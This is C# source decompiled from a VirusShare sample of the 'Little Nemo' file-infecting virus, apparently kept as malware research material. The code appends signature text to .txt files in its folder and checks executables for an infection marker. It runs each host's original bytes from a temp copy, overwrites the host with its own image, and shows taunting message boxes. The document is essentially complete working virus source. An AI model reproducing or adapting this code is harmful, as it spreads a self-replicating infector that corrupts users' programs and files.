// Decompiled with JetBrains decompiler
// Type: nemo.Module1
// Assembly: nemo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 024F7749-5AB6-4CC3-AF67-B7DC2248873E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Virus.MSIL.Small.g-705406fbac8eed4e539735db082d4fb622e99b8706af5c15863d1055f3325f7f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nemo.My;
using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace nemo
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main()
    {
      string applicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
      foreach (object file in (Array) Directory.GetFiles(applicationBase))
      {
        object obj = (object) Conversions.ToString(file);
        if (Operators.CompareString(Path.GetExtension(Conversions.ToString(obj)), ".txt", false) == 0)
        {
          StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(Path.GetFileName(Conversions.ToString(obj)), FileMode.Append, FileAccess.Write));
          streamWriter.WriteLine("><(((*>");
          streamWriter.WriteLine("little nemo the virus");
          streamWriter.WriteLine("by synge flesh");
          streamWriter.WriteLine("of the mighty Doom Riderz");
          streamWriter.WriteLine("txt infected again by nemo");
          streamWriter.Close();
        }
      }
      string path1 = MyProject.Application.Info.AssemblyName + ".exe";
      string str = Conversions.ToString(path1.Length);
      foreach (object file in (Array) Directory.GetFiles(applicationBase))
      {
        string path2 = Conversions.ToString(file);
        if (Operators.CompareString(Path.GetExtension(path2), ".exe", false) == 0)
        {
          string fileName = Path.GetFileName(path2);
          if ((double) fileName.Length != Conversions.ToDouble(str))
          {
            object obj1 = (object) new FileStream(fileName, FileMode.Open, FileAccess.Read);
            object Instance1 = (object) new BinaryReader((Stream) obj1);
            object Instance2 = Instance1;
            object[] objArray1 = new object[1];
            object[] objArray2 = objArray1;
            object Instance3 = obj1;
            object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance3, (Type) null, "Length", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
            objArray2[0] = objectValue;
            object[] objArray3 = objArray1;
            object[] Arguments1 = objArray3;
            bool[] flagArray1 = new bool[1]{ true };
            bool[] CopyBack1 = flagArray1;
            object obj2 = NewLateBinding.LateGet(Instance2, (Type) null, "ReadBytes", Arguments1, (string[]) null, (Type[]) null, CopyBack1);
            if (flagArray1[0])
              NewLateBinding.LateSetComplex(Instance3, (Type) null, "Length", new object[1]
              {
                RuntimeHelpers.GetObjectValue(objArray3[0])
              }, (string[]) null, (Type[]) null, true, false);
            byte[] buffer = (byte[]) obj2;
            if (buffer[200] != (byte) 4)
            {
              Path.GetTempFileName();
              Path.GetTempPath();
              BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream("temp.tmp", FileMode.Create, FileAccess.Write));
              binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
              binaryWriter.Write(buffer);
              binaryWriter.Flush();
              binaryWriter.Close();
              File.Copy("temp.tmp", "temp.exe", true);
              Interaction.Shell("temp.exe");
              File.Delete("temp.tmp");
              NewLateBinding.LateCall(obj1, (Type) null, "close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              object obj3 = (object) new FileStream(path1, FileMode.Open, FileAccess.Read);
              object obj4 = (object) new FileStream(fileName, FileMode.Open, FileAccess.Write);
              object Instance4 = (object) new BinaryReader((Stream) obj3);
              object Instance5 = (object) new BinaryWriter((Stream) obj4);
              int integer = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Instance4, (Type) null, "BaseStream", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, "Length", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) 1));
              int num1 = 0;
              while (num1 <= integer)
              {
                byte num2 = Conversions.ToByte(NewLateBinding.LateGet(Instance4, (Type) null, "ReadByte", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
                object Instance6 = Instance5;
                object[] objArray4 = new object[2]
                {
                  (object) num1,
                  (object) SeekOrigin.Begin
                };
                object[] Arguments2 = objArray4;
                bool[] flagArray2 = new bool[2]
                {
                  true,
                  false
                };
                bool[] CopyBack2 = flagArray2;
                NewLateBinding.LateCall(Instance6, (Type) null, "seek", Arguments2, (string[]) null, (Type[]) null, CopyBack2, true);
                if (flagArray2[0])
                  num1 = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof (int));
                object Instance7 = Instance5;
                object[] objArray5 = new object[1]
                {
                  (object) num2
                };
                object[] Arguments3 = objArray5;
                bool[] flagArray3 = new bool[1]{ true };
                bool[] CopyBack3 = flagArray3;
                NewLateBinding.LateCall(Instance7, (Type) null, "Write", Arguments3, (string[]) null, (Type[]) null, CopyBack3, true);
                if (flagArray3[0])
                {
                  byte num3 = (byte) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray5[0]), typeof (byte));
                }
                checked { ++num1; }
              }
              NewLateBinding.LateCall(Instance1, (Type) null, "Close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              NewLateBinding.LateCall(Instance4, (Type) null, "Close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              NewLateBinding.LateCall(Instance5, (Type) null, "Close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              NewLateBinding.LateCall(obj4, (Type) null, "close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              NewLateBinding.LateCall(obj3, (Type) null, "close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
            }
          }
        }
      }
      int num4 = (int) Interaction.MsgBox((object) "Little Nemo Virus, by synge flesh of the mighty Doom Riderz.");
      int num5 = (int) Interaction.MsgBox((object) "P.S. Fuck Anti-Virus Lamers.");
      int num6 = (int) Interaction.MsgBox((object) "Show respect to those who keep you in business.");
    }
  }
}
